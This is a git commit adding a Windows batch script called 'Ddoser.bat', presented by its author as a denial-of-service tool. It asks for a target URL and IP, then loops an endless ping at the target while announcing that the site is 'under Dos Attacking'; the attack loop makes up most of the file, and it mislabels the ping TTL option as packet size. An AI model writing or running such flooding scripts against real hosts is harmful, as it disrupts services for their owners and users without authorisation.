94592560323333eec7670be03138d7e57ca240cf
Electrovirus <E.electrovirus@gmail.com>
2017-06-09 12:56:11 +0430

    Ddoser

---
+++ Ddoser.bat
@@ -0,0 +1,35 @@
+@echo off
+mode 10
+title EV Doser v.1
+color 0a
+cls
+echo.
+echo ===================================
+echo          laserFlame Doser
+echo       Created by Electrovirus
+echo ===================================
+echo.
+set /p x=Target-URL:
+echo.
+echo ===================================
+ping %x%
+echo ===================================
+@ping.exe 127.0.0.1 -n 5 -w 1000 > nul
+goto Next
+:Next
+echo.
+set /p m=Target IP: 
+echo.
+set /p n=Paccket Size:
+echo.
+color 0c
+echo ===================================
+echo   Attacking started in background
+echo     Site is under Dos Attacking
+echo Please use this in a legal purpose
+echo       Created By Electrovirus
+echo ===================================
+echo.
+:DDOS
+ping %m% -i %n% -t >nul
+goto DDOS
